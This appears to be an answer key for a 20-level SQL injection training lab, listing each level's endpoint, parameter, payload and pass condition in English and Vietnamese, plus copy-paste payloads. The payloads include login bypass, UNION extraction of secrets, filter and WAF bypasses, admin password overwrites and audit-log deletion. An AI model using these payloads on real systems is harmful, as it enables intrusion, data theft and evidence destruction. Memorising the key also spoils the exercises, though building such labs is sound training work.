# SQLi Baseline

This baseline summarizes each level for automated testing. It is a compact contract:
endpoint, parameter, payload, and success criteria.

| Level | Vuln type | Method | Endpoint | Parameter(s) | Payload | Success criteria |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | Login bypass (string) | POST | `/level1` | `username`, `password` | `username=admin' --` | Response contains `ACCESS GRANTED` or `CONGRATULATIONS` |
| 2 | Login bypass (integer) | GET | `/level2` | `id` | `1 OR 1=1` | Response shows multiple products and/or success message |
| 3 | UNION attack (visible) | GET | `/level3` | `search` | `' UNION SELECT id, flag, 1 FROM secrets--` | Response contains `FLAG` |
| 4 | Error-based | GET | `/level4` | `uuid` | `1'` | Response shows SQL error (syntax/unterminated) |
| 5 | Boolean blind | GET | `/level5` | `u` | `admin' AND 1=1--` | Response contains `CONGRATULATIONS` (user found) |
| 6 | Time-based blind | GET | `/level6` | `q` | `' OR sleep(3)--` | Response time >= 2s (or rendered time > 2s) |
| 7 | Filter bypass (space) | GET | `/level7` | `id` | `1/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets` | Response contains `FLAG` |
| 8 | Second-order SQLi | POST + GET | `/level8` | `username` (POST), `step`, `user` (GET) | Step1: `admin' --` then Step2: `/level8?step=view&user=<same>` | Response shows admin role / `CONGRATULATIONS` |
| 9 | WAF bypass (keywords) | GET | `/level9` | `q` | `' UNION/**/SELECT id, flag, 1 FROM secrets--` | Response contains `FLAG` and not blocked |
| 10 | Stacked queries | POST | `/level10` | `id` | `1; UPDATE users SET password='pwned' WHERE username='admin';--` | Response contains `SYSTEM MODIFIED` or `CONGRATULATIONS` |
| 11 | Column list injection | GET | `/level11` | `cols` | `name, (SELECT flag FROM secrets)` | Response contains `FLAG` |
| 12 | Expression injection | GET | `/level12` | `rank` | `(SELECT flag FROM secrets)` | Response contains `FLAG` |
| 13 | IN clause injection | GET | `/level13` | `ids` | `1) UNION SELECT id, flag, 1 FROM secrets--` | Response contains `FLAG` |
| 14 | ESCAPE clause injection | GET | `/level14` | `esc` | `x' OR 1=1 UNION SELECT flag, flag FROM secrets--` | Response contains `FLAG` |
| 15 | UPDATE injection | POST | `/level15` | `username`, `status` | `status=ok', role='admin` | Response contains `CONGRATULATIONS` or user role is admin |
| 16 | INSERT injection | POST | `/level16` | `username` | `hacker', 'pw', 'admin', 'active')--` | Response indicates injected admin user exists |
| 17 | DELETE injection | POST | `/level17` | `log_id` | `1 OR 1=1` | Response shows audit logs are empty |
| 18 | Nested subquery injection | GET | `/level18` | `ref` | `' UNION SELECT flag FROM secrets WHERE '1'='1` | Response contains `FLAG` |
| 19 | Encoded filter bypass (base64) | GET | `/level19` | `payload` | `JScgVU5JT04gU0VMRUNUIGlkLCBmbGFnLCAxIEZST00gc2VjcmV0cy0t` | Response contains `FLAG` |
| 20 | Executescript injection | POST | `/level20` | `filter` | `1=1; UPDATE users SET password='pwned_report' WHERE username='admin';--` | Response contains `CONGRATULATIONS` or success_detected |
# SQLi Vulnweb Baseline

Baseline mô tả 20 level SQL injection: endpoint, method, tham số, payload chuẩn và điều kiện pass. Dùng cho test tự động và tài liệu tham chiếu.

| Level | Title | Vuln Type | Endpoint | Method | Params | Payload | Success Condition |
|-------|--------|-----------|----------|--------|--------|---------|--------------------|
| 1 | Authentication Module | Login bypass (string) | /level1 | POST | username, password | username=`admin' --` | Response chứa "ACCESS GRANTED" hoặc "CONGRATULATIONS" |
| 2 | Data Lookup | Integer injection | /level2 | GET | id | id=`1 OR 1=1` | Response chứa "CONGRATULATIONS" hoặc >1 product |
| 3 | Data Retrieval | UNION attack | /level3 | GET | search | search=`' UNION SELECT id, flag, 1 FROM secrets--` | Response chứa "FLAG" hoặc "CONGRATULATIONS" |
| 4 | System Diagnostics | Error-based | /level4 | GET | uuid | uuid=`1'` | Response có error_msg (syntax/unterminated) và "SYSTEM ANOMALY" / "Error-based" / success_signal |
| 5 | Access Control | Boolean blind | /level5 | GET | u | u=`admin' AND 1=1--` | Response chứa "[ USER FOUND ]" và "CONGRATULATIONS" |
| 6 | Performance Monitor | Time-based blind | /level6 | GET | q | q=`' OR sleep(3)--` | Response time >= 2s hoặc text hiển thị thời gian (e.g. "3.00s") |
| 7 | Input Validation | Filter bypass (space) | /level7 | GET | id | id=`1/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets` | Response chứa "FLAG" hoặc "CONGRATULATIONS" |
| 8 | Multi-Step Process | Second-order SQLi | /level8 | POST then GET | username (form); step, user (query) | Register username=`admin' --`, then GET ?step=view&user=... | Response chứa role admin hoặc "CONGRATULATIONS". Reset trước test. |
| 9 | Security Layer | WAF bypass (keywords) | /level9 | GET | q | q=`' UNION/**/SELECT id, flag, 1 FROM secrets--` | Response chứa "FLAG" hoặc "CONGRATULATIONS" |
| 10 | Batch Operations | Stacked queries | /level10 | POST | id | id=`1; UPDATE users SET password='pwned' WHERE username='admin';--` | Response chứa "CONGRATULATIONS" / "SYSTEM MODIFIED". Reset trước test. |
| 11 | Column Picker | SELECT list injection | /level11 | GET | cols | cols=`name, (SELECT flag FROM secrets)` | Response chứa "FLAG" hoặc "CONGRATULATIONS" |
| 12 | Ranking Engine | Expression injection | /level12 | GET | rank | rank=`(SELECT flag FROM secrets)` | Response chứa "FLAG" hoặc "CONGRATULATIONS" |
| 13 | Batch Selector | IN clause injection | /level13 | GET | ids | ids=`1) UNION SELECT id, flag, 1 FROM secrets--` | Response chứa "FLAG" hoặc "CONGRATULATIONS" |
| 14 | Wildcard Escape | ESCAPE clause injection | /level14 | GET | q, esc | q=Power, esc=`x' OR 1=1 UNION SELECT flag, flag FROM secrets--` | Response chứa "FLAG" hoặc "CONGRATULATIONS" |
| 15 | Profile Update | UPDATE injection | /level15 | POST | username, status | username=user, status=`ok', role='admin` | Response có success_detected (user role=admin). Reset trước nếu cần. |
| 16 | Signup Service | INSERT injection | /level16 | POST | username | username=`hacker', 'pw', 'admin', 'active')--` | Response có success_detected (admin mới). Reset trước nếu cần. |
| 17 | Audit Cleanup | DELETE injection | /level17 | POST | log_id | log_id=`1 OR 1=1` | Response chứa "CONGRATULATIONS" / logs rỗng. Reset trước test. |
| 18 | Nested Query | Subquery injection | /level18 | GET | ref | ref=`' UNION SELECT flag FROM secrets WHERE '1'='1` | Response chứa "FLAG" hoặc "CONGRATULATIONS" |
| 19 | Encoded Filter | Base64 bypass | /level19 | GET | payload | payload=`JScgVU5JT04gU0VMRUNUIGlkLCBmbGFnLCAxIEZST00gc2VjcmV0cy0t` (Base64 of `%' UNION SELECT id, flag, 1 FROM secrets--`) | Response chứa "FLAG" hoặc "CONGRATULATIONS" |
| 20 | Report Builder | Script/stacked injection | /level20 | POST | filter | filter=`1=1; UPDATE users SET password='pwned_report' WHERE username='admin';--` | Response chứa "CONGRATULATIONS" / admin password pwned_report. Reset trước test. |

## Payloads chi tiết (copy-paste)

- **Level 1**: `admin' --` (username), password bất kỳ
- **Level 2**: `1 OR 1=1`
- **Level 3**: `' UNION SELECT id, flag, 1 FROM secrets--`
- **Level 4**: `1'` (param uuid)
- **Level 5**: `admin' AND 1=1--`
- **Level 6**: `' OR sleep(3)--`
- **Level 7**: `1/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets`
- **Level 8**: Register `admin' --`, then GET view profile với user đó
- **Level 9**: `' UNION/**/SELECT id, flag, 1 FROM secrets--`
- **Level 10**: `1; UPDATE users SET password='pwned' WHERE username='admin';--`
- **Level 11**: `name, (SELECT flag FROM secrets)`
- **Level 12**: `(SELECT flag FROM secrets)`
- **Level 13**: `1) UNION SELECT id, flag, 1 FROM secrets--`
- **Level 14**: esc=`x' OR 1=1 UNION SELECT flag, flag FROM secrets--`
- **Level 15**: status=`ok', role='admin`
- **Level 16**: username=`hacker', 'pw', 'admin', 'active')--`
- **Level 17**: log_id=`1 OR 1=1`
- **Level 18**: ref=`' UNION SELECT flag FROM secrets WHERE '1'='1`
- **Level 19**: payload=`JScgVU5JT04gU0VMRUNUIGlkLCBmbGFnLCAxIEZST00gc2VjcmV0cy0t`
- **Level 20**: filter=`1=1; UPDATE users SET password='pwned_report' WHERE username='admin';--`

## Reset DB

Gọi GET `/reset` trước khi test các level thay đổi state: 8, 10, 15, 16, 17, 20.
